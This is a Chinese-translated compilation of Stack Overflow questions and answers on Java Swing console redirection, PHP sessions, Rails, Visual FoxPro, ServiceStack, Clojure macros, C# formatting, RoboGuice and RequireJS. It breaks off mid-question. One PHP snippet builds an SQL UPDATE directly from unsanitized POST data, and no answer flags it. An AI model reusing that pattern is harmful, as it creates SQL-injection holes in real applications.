我现在正在向这个程序添加一个 GUI。我能够使用按钮创建 GUI，这些按钮工作正常。我的问题是我想将打印到 Eclipse 控制台（或命令行）的所有内容实时打印到我的 GUI 中的文本框中。我怎样才能轻松做到这一点？

```
package Onur;

import java.awt.BorderLayout;

public class BehaSendDFGUI extends JFrame {

    private BehaviourSendWithDF1 myAgent; // Reference to the agent class
    private JPanel contentPane;
    private JDesktopPane desktopPane;
    private JButton btnMessage;
    private JButton btnMessage_1;
    private JButton btnMessage_2;
    private JButton btnMessage_3;
    private JTextArea textArea = new JTextArea();

    public void setAgent(BehaviourSendWithDF1 a) {
        myAgent = a; // provide the value of the reference of BehaviourSendWithDF1 class here

    }

    private void updateTextArea(final String text) {
          SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                textArea.append(text);
            }
          });
        }

        private void redirectSystemStreams() {
          OutputStream out = new OutputStream() {
            @Override
            public void write(int b) throws IOException {
              updateTextArea(String.valueOf((char) b));
            }

            @Override
            public void write(byte[] b, int off, int len) throws IOException {
              updateTextArea(new String(b, off, len));
            }

            @Override
            public void write(byte[] b) throws IOException {
              write(b, 0, b.length);
            }
          };

          System.setOut(new PrintStream(out, true));
          System.setErr(new PrintStream(out, true));
        }

    /**
     * Launch the application.
     */
    public static void main(String[] args) {
        try {
            UIManager.setLookAndFeel(UIManager.getSystemLookAndFeelClassName());
        } catch (Throwable e) {
            e.printStackTrace();
        }
        EventQueue.invokeLater(new Runnable() {
            public void run() {
                try {
                    BehaSendDFGUI frame = new BehaSendDFGUI();
                    frame.setVisible(true);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * Create the frame.
     */
    public BehaSendDFGUI() {

        setTitle("Behaviour Sender");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        setBounds(100, 100, 523, 398);

        JMenuBar menuBar = new JMenuBar();
        setJMenuBar(menuBar);

        JMenu mnFile = new JMenu("File");
        menuBar.add(mnFile);

        JMenuItem mntmExit = new JMenuItem("Exit");
        mnFile.add(mntmExit);

        JMenu mnAbout = new JMenu("About");
        menuBar.add(mnAbout);

        JMenuItem mntmAboutThisGui = new JMenuItem("About This GUI");
        mnAbout.add(mntmAboutThisGui);
        contentPane = new JPanel();
        contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
        contentPane.setLayout(new BorderLayout(0, 0));
        setContentPane(contentPane);

        JToolBar toolBar = new JToolBar();
        toolBar.setFloatable(false);
        contentPane.add(toolBar, BorderLayout.CENTER);

        desktopPane = new JDesktopPane();
        toolBar.add(desktopPane);

        btnMessage = new JButton("Send Message 1");
        btnMessage.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                BehaviourSendWithDF1.STEP = "1";
                System.out.println("Button Pressed => STEP = " + BehaviourSendWithDF1.STEP );
                myAgent.behaSend();             
            }

        });
        btnMessage.setBounds(10, 11, 111, 23);
        desktopPane.add(btnMessage);

        btnMessage_1 = new JButton("Send Message 2");
        btnMessage_1.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent arg0) {
                BehaviourSendWithDF1.STEP = "2";
                System.out.println("Button Pressed => STEP = " + BehaviourSendWithDF1.STEP );
                myAgent.behaSend(); 
            }
        });
        btnMessage_1.setBounds(131, 11, 111, 23);
        desktopPane.add(btnMessage_1);

        btnMessage_2 = new JButton("Send Message 3");
        btnMessage_2.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                BehaviourSendWithDF1.STEP = "3";
                System.out.println("Button Pressed => STEP = " + BehaviourSendWithDF1.STEP );
                myAgent.behaSend(); 
            }
        });
        btnMessage_2.setBounds(252, 11, 111, 23);
        desktopPane.add(btnMessage_2);

        btnMessage_3 = new JButton("Send Message 4");
        btnMessage_3.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                BehaviourSendWithDF1.STEP = "4";
                System.out.println("Button Pressed => STEP = " + BehaviourSendWithDF1.STEP );
                myAgent.behaSend(); 
            }
        });
        btnMessage_3.setBounds(373, 11, 111, 23);
        desktopPane.add(btnMessage_3);

        JButton btnExitGui = new JButton("Exit GUI");
        btnExitGui.addActionListener(new ActionListener() {
            public void actionPerformed(ActionEvent e) {
                dispose();
            }
        });
        btnExitGui.setBounds(189, 293, 130, 23);
        desktopPane.add(btnExitGui);

        JTextPane txtpnConsoleOutput = new JTextPane();
        txtpnConsoleOutput.setText("Console Output:");
        txtpnConsoleOutput.setBounds(10, 45, 101, 20);
        desktopPane.add(txtpnConsoleOutput);

        JScrollPane scrollPane = new JScrollPane();
        scrollPane.setBounds(10, 76, 475, 206);
        desktopPane.add(scrollPane);
        scrollPane.setViewportView(textArea);

        redirectSystemStreams();

    }
} 
```

我在 NetBeans 上看到过这个解决方案，但无法将其应用于 WindowBuilder：

[http://unserializableone.blogspot.com/2009/01/redirecting-systemout-and-systemerr-to.html](http://unserializableone.blogspot.com/2009/01/redirecting-systemout-and-systemerr-to.html)

提前致谢。

**编辑：**代码的工作版本在问题中进行了编辑。感谢所有的帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:55:43.833

您的问题包括

1.  您正在尝试使用不存在的变量 textPane 和
2.  您的程序没有可以显示文本的文本组件。我建议您至少添加一个 JTextArea，以便您可以将输出重定向到它。如果您愿意，可以将其称为 textPane，但无论您如何称呼它，您至少需要拥有可以显示多行文本的*东西。*
3.  同样，您提供的链接中描述的一般技术是正确的——您需要将 System.out 和 System.err 重定向到您创建的 OutputStream，
4.  但是您必须注意仅在 Swing 事件线程上更新 Swing 组件，因此使用`SwingUtilities.invokeLater(new Runnable() {...})`...
5.  因此，正确使用文章的建议*将*起作用。所以坚持下去。

再次，阅读 Swing 教程并把 windows builder 代码生成器放在一边。代码生成器可用于节省您的时间，但如果您在充分了解 Swing 库之前使用它们，那么您可能会遇到大问题，因为您需要的不仅仅是最基本的 GUI 和行为。

**编辑**
您似乎正在尝试调用`append(...)`JTextField，并且此类不允许该消息。我建议

*   你大大简化了你的类，所以它只有最基本的 GUI 来演示 System.out 和 err 的重定向，以及
*   再次使用 JTextArea，而不是 JTextField。

**编辑 2**
你问：

> 我无法解决'textArea.append(text);' 范围错误：无法解析 textArea。

请注意您***声明***textArea 变量的位置。由于它没有在类中声明，而是在方法或构造函数中声明，因此它在类的其他地方不可见。解决方案是在类中声明它，而不是在其他地方。

**编辑 3**
例如，

```
import java.awt.event.ActionEvent;
import java.io.IOException;
import java.io.OutputStream;
import java.io.PrintStream;

import javax.swing.*;

@SuppressWarnings("serial")
public class RedirectOut extends JPanel {
   private static final int BUTTON_COUNT = 4;
   private JTextArea textArea = new JTextArea(20, 20);
   private SomeAgent myAgent;

   public RedirectOut() {
      redirectSystemStreams();

      setLayout(new BoxLayout(this, BoxLayout.PAGE_AXIS));

      for (int i = 0; i < BUTTON_COUNT; i++) {
         final int count = i + 1;
         JButton button = new JButton(new AbstractAction("Send Message " + count){
            @Override
            public void actionPerformed(ActionEvent e) {
               myAgent.setStep(String.valueOf(count));
               System.out.println("Button Pressed => STEP = "
                     + myAgent.getStep());
               myAgent.behaSend();
            }
         });
         JPanel btnPanel = new JPanel();
         btnPanel.add(button);
         add(btnPanel);
      }
      add(new JScrollPane(textArea, JScrollPane.VERTICAL_SCROLLBAR_ALWAYS, 
            JScrollPane.HORIZONTAL_SCROLLBAR_NEVER));
   }

   public void setAgent(SomeAgent agent) {
      this.myAgent = agent;
   }

   public void updateTextArea(final String text) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            textArea.append(text);
         }
      });
   }

   private void redirectSystemStreams() {
      OutputStream out = new OutputStream() {
         @Override
         public void write(int b) throws IOException {
            updateTextArea(String.valueOf((char) b));
         }

         @Override
         public void write(byte[] b, int off, int len) throws IOException {
            updateTextArea(new String(b, off, len));
         }

         @Override
         public void write(byte[] b) throws IOException {
            write(b, 0, b.length);
         }
      };

      System.setOut(new PrintStream(out, true));
      System.setErr(new PrintStream(out, true));
   }

   private static void createAndShowGui() {
      RedirectOut redirectOut = new RedirectOut();
      redirectOut.setAgent(new SomeAgent());

      JFrame frame = new JFrame("RedirectOut");
      frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
      frame.getContentPane().add(redirectOut);
      frame.pack();
      frame.setLocationByPlatform(true);
      frame.setVisible(true);
   }

   public static void main(String[] args) {
      SwingUtilities.invokeLater(new Runnable() {
         public void run() {
            createAndShowGui();
         }
      });
   }
} 
```

# php - PHP会话变量未显示在其他页面上

> ID：15772793
> 
> 赞同：0
> 
> 时间：2013-04-02T19:34:40.367
> 
> 标签：php, ajax, session, session-variables

我有一个页面，我正在向其中发布来自 python 脚本的数据。我正在处理该数据，将数据存储到 SQL 中。我想存储发出此帖子请求的时间。请注意，发布请求是连续发出的。所以会话变量不断变化。好吧，这是一个小代码-

```
<?PHP
session_start();
include 'db.inc.php';

if(isset($_POST['data']){
$data_decode = (array)json_decode($_POST['data']);
$data_var1 = $data_decode['var1'];
$data_var2 = $data_decode['var2'];
$data_var3 = $data_decode['var3'];
$date = date('Y-m-d H:i:s');
$_SESSION['time'] = $date;  //Set the session with current time
$sql = "UPDATE `table` SET row1=$data_var1, row2=$data_var2 WHERE row3=$data_var3";
$result = mysqli_query($db,$link) or die('Table could not be updated');
echo "Following data inserted: row1=$data_var1, row2=$data_var2, at $_SESSION['time']"; //Echoing the data and time as expected
?> 
```

现在，我在同一个域上有另一个页面，它发出 ajax 请求并每秒从我刚刚插入数据的 SQL 表中取出数据。所以这是整个场景——客户端python脚本向网页发出post请求，用接收到的数据更新sql，设置会话变量。另一个页面同时使用 ajax 获取该数据并显示它。

现在我在另一个页面上调用会话变量，如图所示 -

```
<?php
session_start();
if(isset($_SESSION['time']){ echo $_SESSION['time']; } //Didn't echoes anything
?> 
```

我曾经`<?php print_r($_SESSION) ?>`检查会话变量是否设置，它回显“Array（）”，这意味着我的会话变量没有设置。所以我的问题是，我做错了什么，我该如何纠正？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-02T19:36:17.887

确保`session_start()`在每一页的开头调用...

您忘记了声明后的分号。

```
$_SESSION['time'] = $date 
```

应该

```
$_SESSION['time'] = $date; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-02T19:36:43.230

你忘了 session_start()

```
<?php
session_start();
if(isset($_SESSION['time']){ echo $_SESSION['time']; } //Didn't echoes anything
?> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-02T21:20:00.990

我正在尝试重建哪些组件在您的场景中起作用。

所以首先你提到了一个 Python 脚本。它如何与 PHP 一起工作？它实际上是自己发出 HTTP 请求，还是只将 HTML 发送到浏览器，然后再发送到 PHP？如果 Python 充当 HTTP 客户端，这很重要，因为 PHP 会话使用 cookie，因此您的 Python 脚本必须能够接受“Set-cookie”HTTP 标头并处理它，尤其是在以后的请求中将其发回。

第二个信息是有一些 Ajax 正在进行。这指向一个浏览器和一些 Javascript 作为客户端，这个组合显然能够接受 PHP 设置的任何 cookie。

但是浏览器和 Python 脚本是如何通信的呢？浏览器如何知道 Python 脚本从 PHP 中取回了哪个 cookie，从而可以加载会话数据？

我希望你能看到你方法中的漏洞。将数据从 Python 发布到数据库是一回事，保存此事件的时间可能是全局信息（上次数据库更新的日期），而不是会话信息（每个 Python 客户端不同）。因此，会话是错误的存储位置。另一个障碍是您的 Ajax 客户端无法从您的 Python 客户端共享会话 ID！会话的最后一个缺点：如果它有效，您将不断干扰两个请求，因为会话使用锁定来防止两个请求删除彼此的数据。这尤其糟糕，因为挂起的 Ajax 请求可能会阻止 Python 脚本写入数据库，反之亦然。

找到一种在服务器上存储全局信息的方法。您已经有一个数据库，为什么不使用它呢？

# ruby-on-rails-3 - 为什么遇到验证错误时我的新函数没有重新创建对象？

> ID：15772800
> 
> 赞同：1
> 
> 时间：2013-04-02T19:34:59.370
> 
> 标签：ruby-on-rails-3

我正在检查我的应用程序并确保它正确响应验证问题。在这种特殊情况下，当创建一个新的交货单时，您必须在创建一个时使用一个唯一的编号。我发现当我输入重复号码时，系统会显示错误。

错误是：

```
undefined method `purchase_request_fundings' for nil:NilClass 
```

我明白为什么会发生这个错误，但我不明白如何解决它。发生该错误是因为在应用程序发现验证错误后，它会尝试将用户踢回交付订单新功能，并显示友好的错误消息以显示给用户，但是，@purchase_request 对象在它被实例化时没有使用任何数据回到新功能。我认为它没有看到正确查找和设置对象所需的参数，因此对象 - @purchase_request - 保留为零。

我的代码：

```
Controller

def new                                                                                                                        
  @delivery_order = DeliveryOrder.new(:purchase_request_id => params[:purchase_request])                                       
  @purchase_request = PurchaseRequest.find(@delivery_order.purchase_request_id)                                                
end  

def create                                                                                                                     
  @delivery_order = DeliveryOrder.new(params[:delivery_order])                                                                 

  respond_to do |format|                                                                                                       
    if @delivery_order.save                                                                                                    
      params[:discrete_tasks].each do |key, value|                                                                             
        DeliveryOrderFunding.create(                                                                                           
          :delivery_order_id => @delivery_order.id,                                                                            
          :discrete_task_id => key,                                                                                            
          :amount => value                                                                                                     
        )                                                                                                                      
      end                                                                                                                      

      format.html do                                                                                                           
        flash[:success] = "Delivery Order was succesfully created"                                                            
        redirect_to @delivery_order                                                                                            
      end                                                                                                                      
    else                                                                                                                       
      format.html { render action: "new" }                                                                                     
    end                                                                                                                        
  end                                             
end 
```

查看包括

```
= hidden_field_tag 'delivery_order[purchase_request_id]', params[:purchase_request] 
```

也试过

```
= hidden_field_tag :purchase_request, params[:purchase_request] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-02T19:44:39.427

如果我正确理解这种情况，您的调用`render action: "new"`不会调用控制器中的方法，它只会使用您的 create 方法设置的实例变量来`new`呈现视图。`new`因此，您需要执行以下操作：

```
def create
   @delivery_order = DeliveryOrder.new(params[:delivery_order]) 

   respond_to do |format|
      if @delivery_order.save
         ...
      else
         format.html do 
            @purchase_request = PurchaseRequest.find(@delivery_order.purchase_request_id)
            render action: "new"
         end
      end
   end
end 
```

# compression - 在 Visual Foxpro 中使用 easyzlib.dll

> ID：15772801
> 
> 赞同：0
> 
> 时间：2013-04-02T19:35:05.210
> 
> 标签：compression, visual-foxpro, entry-point, dllregistration, entrypointnotfoundexcept

easyzlib生成一个dll文件，并尝试注册它，但出现错误。然后，在 Visual Foxpro 中创建一个项目以使用 ezlib.dll，但其他错误生成：“找不到入口点 ezcompress int DLL。”

这是测试代码：

```
 DECLARE Integer ezcompress IN ezlib.Dll;
      unsigned char pDest, long pnDestlen, const unsigned char pSrc, long nSrcLen;
    DECLARE Integer ezuncompress IN ezlib.Dll;
      unsigned char pDest, long pnDestlen, const unsigned char pSrc, long nSrcLen;

    arq = GETFILE('TXT', 'ProcuraR UM txt:.', '', 1, 'Navegar')
    result = ezcompress(0, 0, @arq, 0)

    if(result >= 0)
        ? "Comprimido com sucesso!"

    Read Events 
```

请帮帮我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T21:31:06.393

DECLARE 中的函数名区分大小写。这可能是你的问题吗？

对于 VFP，您还可以考虑使用 Craig Boyd 的压缩库：[http ://www.sweetpotatosoftware.com/spsblog/2009/08/09/MajorVFPEncryptionUpdate.aspx](http://www.sweetpotatosoftware.com/spsblog/2009/08/09/MajorVFPEncryptionUpdate.aspx)

# asp.net - 如何将现有 SOAP 端点迁移到 ServiceStack

> ID：15772802
> 
> 赞同：2
> 
> 时间：2013-04-02T19:35:12.930
> 
> 标签：asp.net, servicestack

我很幸运能够使用我选择的工具（ServiceStack）启动一个新项目。架构非常稳固，产品在 web api 出现之前就已经面世了。话虽如此，如果我还可以重新创建一些遗留 SOAP 端点并通过此服务进行路由，而不是同时运行两个 api，那将是一个很大的优势。有没有首选的方法来做这样的事情？

谢谢你，斯蒂芬

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:52:10.003

不确定将遗留 SOAP 端点迁移到 ServiceStack 需要什么。

但是 ServiceStack 的[SOAP 支持](https://github.com/ServiceStack/ServiceStack/wiki/SOAP-support)与所有其他 REST、Web 和 MQ 端点以及 Content-Type 一样工作，它会自动公开围绕您的服务请求和响应 DTO 的 SOAP 端点，从而允许通过 SOAP 1.1/1.2 调用它。

SOAP 的固有限制意味着只有支持 POST（即 Post() 或 Any()）的服务才能被 SOAP 调用。对于使用任何其他 HTTP/REST 动词的服务，它将在元数据页面中被禁用，如[SocialBootstrap API](http://bootstrapapi.apphb.com/api/metadata)元数据页面所示。有关您应该厌倦的其他事情，请参阅[SOAP 限制。](https://github.com/ServiceStack/ServiceStack/wiki/SOAP-support#soap-limitations)

[元数据页面](http://bootstrapapi.apphb.com/api/metadata)还包含指向您的服务 WSDL 和 XSD 的链接，例如：

*   [/api/soap11/](http://bootstrapapi.apphb.com/api/soap11)
*   [/api/soap12](http://bootstrapapi.apphb.com/api/soap12)
*   XSD：[/api/metadata?xsd=1](http://bootstrapapi.apphb.com/api/metadata?xsd=1)

如果您想在同一个应用程序中托管旧的 .asmx SOAP 服务，那么您应该[在 /custompath 上托管 ServiceStack，](http://www.servicestack.net/ServiceStack.Hello/#custompath)这样您就可以将它与任何其他 ASP.NET Web、MVC 或其他 Web 服务框架一起使用。

# macros - 卫生宏：功能参数名称？

> ID：15772803
> 
> 赞同：3
> 
> 时间：2013-04-02T19:35:14.740
> 
> 标签：macros, clojure

我有一个产生函数的宏。我知道最好的做法是使用 gensyms 来确保不会发生命名冲突。所以我想知道对于宏将定义的函数的参数名称是否需要遵循这个原则？

这是我的宏供参考：

```
(defmacro defroute
  [routename uri meths handler]
  `(defn ~routename
    [~'req]
    (let [req-meth# (:request-method ~'req)
          bad-meth# (nil? (some #(= req-meth# %) ~meths))
          any-meth# (= ~meths [:any])]
      (if (:uri ~'req)
        (if (and (route-matches ~uri ~'req) (and bad-meth# (not any-meth#)))
          (method-not-allowed req-meth# (get-allowed ~meths))
          (let [params# (route-matches ~uri ~'req)]
            (if (nil? params#)
              ~'req
              (~handler (assoc ~'req :route-params params#)))))
        ~'req)))) 
```

如您所见，我目前没有使用 gensym 作为`req`参数。我最初然后想知道是否有必要。无论如何，感谢您的阅读。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-02T19:44:08.513

在这种情况下，使用`req`是相对安全的，因为它建立了一个本地范围。作为函数参数，它将隐藏调用命名空间中与符号 req 的任何现有绑定，而不会损坏它们。这样做的代价是，如果有人试图将名称 req 用于任何其他参数，例如 handler，他们可能会感到有点意外。在我看来，这段代码并没有错，尽管它在某些情况下确实**违反了最小化原则。**我认为没有任何理由不使用自动生成符号，`req`因为它只是添加几个`#`s 的工作。

# c# - Int.ToString 格式等价于 String.Format("{0,9}" , int)

> ID：15772808
> 
> 赞同：3
> 
> 时间：2013-04-02T19:35:23.777
> 
> 标签：c#, string-formatting

有没有`formatString`这样的价值：

```
intValue.ToString(formatString) == String.Format("{0,9}", intValue) 
```

对于不超过 100 万的所有正整数值？

特别是，输出必须是 9 个字符，并在开头用空格填充。

`000000000`会给我正确的长度，但用零填充。

至于为什么我不只是使用`String.Format("{0,9}", intValue)`，我正在尝试创建一个配置文件，第三方程序将读取并使用它来创建输出文件，我无法更改该程序中的代码。我知道该程序是用 C# 编写的，从它使用的当前配置文件中可以明显看出`ToString()`。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:37:41.820

你不能。

任何重载`{0:xxx}`都不支持[复合格式字符串](http://msdn.microsoft.com/en-gb/library/txafckwd.aspx)( )，但使用复合格式字符串的方法支持[标准数字格式字符串。](http://msdn.microsoft.com/en-gb/library/dwhawy9k.aspx)`ToString`

> .NET Framework 复合格式化功能也支持标准数字格式字符串，Console 和 StreamWriter 类的某些 Write 和 WriteLine 方法、String.Format 方法和 StringBuilder.AppendFormat 方法使用该功能。

# android - 我的 robofragment 无法注入视图（roboguice 2.0）

> ID：15772809
> 
> 赞同：1
> 
> 时间：2013-04-02T19:35:25.593
> 
> 标签：android, android-fragments, roboguice

我在从我的片段 roboguice 夸大视图时遇到问题，不知道为什么会发生这种情况..

这是我的代码

头等舱

```
public class AppController extends RoboFragmentActivity {

@InjectView(R.id.rtlPrincipalPaginaPrincipal)  RelativeLayout rtlPrincipal;
@InjectView(R.id.rtlPrincipalMenuQr)  RelativeLayout rtlMenuQr;
@InjectView(R.id.rtlPrincipalPaginaTrasera)  RelativeLayout rtlTraera;

private FragmentManager fragment_manager;

 public void onCreate(Bundle savedInstanceState) {
     super.onCreate(savedInstanceState);
     this.requestWindowFeature(Window.FEATURE_NO_TITLE);

     objFragmenManager = AppController.this.getSupportFragmentManager();
        setContentView(R.layout.activitylayout);

    objAnimationbjar = AnimationUtils.loadAnimation(this, R.anim.linear);
    objAnimationSubir = AnimationUtils.loadAnimation(this, R.anim.linear2);
            final SharedPreferences prefs =
                     AppController.this.getSharedPreferences("MisPreferencias",Context.MODE_PRIVATE);

     LlenarHandler();//para podr recibir llamadas de las otras clases
     LlenarPaginaPrincipal();// pagina principal donde mostramos las poromociones

 }
 private void LlenarPaginaPrincipal(){
     objNavegar = new Cnavegar();

     Cnavegar objNavegar= new Cnavegar();
     Fragment frmTopmen = new AfrmProciones();
     objNavegar.RemplazarFragmento(R.id.rtlPrincipalPaginaTrasera,frmTopmen, "AfrmProciones",objFragmenManager);

 } 
```

现在在片段中

```
public class AfrmProciones extends RoboFragment{

@InjectView(R.id.btnCity) Button btnBajar;
        @InjectView(R.id.vfShow) ViewFlipper vfPromociones;
        @InjectView(R.id.prgProgresoPomos) ProgressBar pgrProgreso;
        @InjectView(R.id.Crono) Chronometer objCrono;

View vPromos;

private Handler mHandler;
private static final int SWIPE_MIN_DISTANCE = 120;
private static final int SWIPE_THRESHOLD_VELOCITY = 200;
ArrayList<Cpromocion> lstPromo;

@SuppressWarnings("deprecation")
private final GestureDetector detector = new GestureDetector(new MyGestureDetector());

AccesoBd objAcceso;
Promociones taspromociones;
ObjectAnimator objAnimFondo;
AlarmManager objAlarma;
BroadcastReceiver objBroadcast;
int itiempo;

public AfrmProciones(Handler rHandler){
    mHandler = rHandler;
}

public AfrmProciones(){

}

@Override
 public View onCreateView(LayoutInflater inflater, ViewGroup container,
          Bundle savedInstanceState) {
    super.onCreateView(inflater, container, savedInstanceState);

    RoboGuice.getInjector(getActivity()).injectMembers(this);

RegistrarEventos();

LlenarPromociones();

    return vPromos; 
      }

private void RegistrarEventos(){
    btnBajar.setOnClickListener(new OnClickListener(){

        public void onClick(View v) {
            Message msg = new Message();
            msg.setTarget(mHandler);
            msg.obj = "TriggerMenu";
            msg.sendToTarget();
        }

    });

    vfPromociones.setOnTouchListener(new OnTouchListener() {
        @Override
        public boolean onTouch(final View view, final MotionEvent event) {
            detector.onTouchEvent(event);
            return true;
        }
    });

    objCrono.setOnChronometerTickListener(new OnChronometerTickListener() {

        @Override
        public void onChronometerTick(Chronometer chronometer) {
            // TODO Auto-generated method stub

            if (itiempo==2){
                vfPromociones.showNext();
                itiempo=0;
            }else{

                itiempo+=1; 
            }

        }
    });

} 
```

这是我的日志

```
 04-02 21:28:47.536: E/AndroidRuntime(17947): FATAL EXCEPTION: main
04-02 21:28:47.536: E/AndroidRuntime(17947): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.silice.qrstorecomerciales/com.silice.qrstore.AppController}: java.lang.NullPointerException
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2110)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2135)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread.access$700(ActivityThread.java:140)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1237)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.os.Handler.dispatchMessage(Handler.java:99)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.os.Looper.loop(Looper.java:137)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread.main(ActivityThread.java:4921)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at java.lang.reflect.Method.invokeNative(Native Method)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at java.lang.reflect.Method.invoke(Method.java:511)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1027)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:794)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at dalvik.system.NativeStart.main(Native Method)
04-02 21:28:47.536: E/AndroidRuntime(17947): Caused by: java.lang.NullPointerException
04-02 21:28:47.536: E/AndroidRuntime(17947):    at com.jesus.PrincipalPromociones.AfrmProciones.RegistrarEventos(AfrmProciones.java:116)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at com.jesus.PrincipalPromociones.AfrmProciones.onCreateView(AfrmProciones.java:96)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:871)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.support.v4.app.FragmentManagerImpl.moveToState(FragmentManager.java:1083)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.support.v4.app.BackStackRecord.run(BackStackRecord.java:635)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.support.v4.app.FragmentManagerImpl.execPendingActions(FragmentManager.java:1431)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.support.v4.app.FragmentActivity.onStart(FragmentActivity.java:523)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at roboguice.activity.RoboFragmentActivity.onStart(RoboFragmentActivity.java:53)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.Instrumentation.callActivityOnStart(Instrumentation.java:1178)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.Activity.performStart(Activity.java:5216)
04-02 21:28:47.536: E/AndroidRuntime(17947):    at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2083)
04-02 21:28:47.536: E/AndroidRuntime(17947):    ... 11 more 
```

我一直在寻找云，但找不到与此相关的任何内容。事实是，在课堂上，如果他们扩展它，它会正确注入 robofragmentactivity，一旦发生这种情况，robofragment 就会停止为我工作。

是因为这个我留下了设置吗？

**谢谢**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-02T20:35:18.953

在 RoboFragment 中，视图被注入到`onViewCreated`方法中。

`RegistrarEventos()`在此之前调用您的方法，因此`NullPointerException`当您尝试引用`btnBajar`视图时会得到一个。

**注意：**在 Java 中，习惯上使用小写首字母命名您的方法，类的首字母大写

# javascript - 为什么使用 Miso 时 _ 未定义？

> ID：15772810
> 
> 赞同：3
> 
> 时间：2013-04-02T19:35:33.067
> 
> 标签：javascript, requirejs, underscore.js

我正在尝试使用 Miso ( [http://misoproject.com/dataset/](http://misoproject.com/dataset/) )，并且依赖项之一是 underscore.js。我正在使用 require.js，并在控制台中不断收到错误消息：“未捕获的 ReferenceError：_ 未定义。” 这是我的 main.js 文件：

```
require(["jquery", "underscore", "miso"], function($, _, miso) {

  $(function() {
    var ds = new Miso.Dataset({
      url : "/data/ma_region.csv",
      delimiter : " ",
    });
  });

}); 
```

有任何想法吗？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-02T19:49:11.963

Miso`_`在全球范围内期待下划线。

在味噌的代码中：

```
(function(global, _) {

    /* has bunch of stuff using underscore */

}(this, _)); 
```

这意味着在最后一部分`(this, _)`中，它没有对`_`下划线库的引用，因为它是在 RequireJS 中定义的，这意味着它存在于匿名函数范围内。

因此，您需要`_`在模块中加载下划线并将 Miso 包装起来，例如：

```
define(['underscore'], function(_) {

 /** Miso's code here because Miso is expecting the _ **/

}); 
```

[对于 Miso 网站http://misoproject.com/dataset/tutorials/quickstart](http://misoproject.com/dataset/tutorials/quickstart)上列出的其他依赖项，您需要将其包括在内：

> 依赖项
> 
> 如果您选择包含没有内置依赖项的生产版本，您可能需要自己包含它们。数据集需要以下库：
> 
> *   LoDash 0.9.0
> *   Underscore.math.js（未知版本）
> *   下划线.deferred.js 0.2.0
> *   moment.js 1.7.2（用于“时间”数据类型）
> 
> 如果您使用的是 IE，则需要包含 json2.js：
> 
> *   json2.js 2011-10-19

或者，我建议使用已经预先打包依赖项的 Miso 版本，这样您就不必担心这一点。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-02T19:46:11.137

确保您的下划线库名为 underscore.js，并且它与您的 javascript 代码位于同一目录中。这是 require.js 的 baseURL。

如果不是这种情况，您应该配置路径。参考[http://requirejs.org/docs/api.html#config-paths](http://requirejs.org/docs/api.html#config-paths)

# c# - asmx 服务方法中的可空参数导致其他方法失败

> ID：15772812
> 
> 赞同：15
> 
> 时间：2013-04-02T19:35:41.457
> 
> 标签：c#, asp.net, asmx

要重新创建我看到的问题，使用 VS2010，创建一个空网站并添加一个带有代码隐藏的 Web 服务 (asmx)。

使用以下代码，可以成功调用两个 webmethod：

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class WebService : System.Web.Services.WebService {
    [WebMethod]
    public void Method1(int x) {
        // i'm good
    }
    [WebMethod]
    public string Method2(int x) {
        return "it worked";
    }
} 
```

现在，如果我将方法 2 上的参数更改为可空类型，它工作得很好，但它会使方法 1 失败......

```
[WebService(Namespace = "http://tempuri.org/")]
[WebServiceBinding(ConformsTo = WsiProfiles.BasicProfile1_1)]
public class WebService : System.Web.Services.WebService {
    [WebMethod]
    public void Method1(int x) {
        // no changes made to this method, but it no longer works
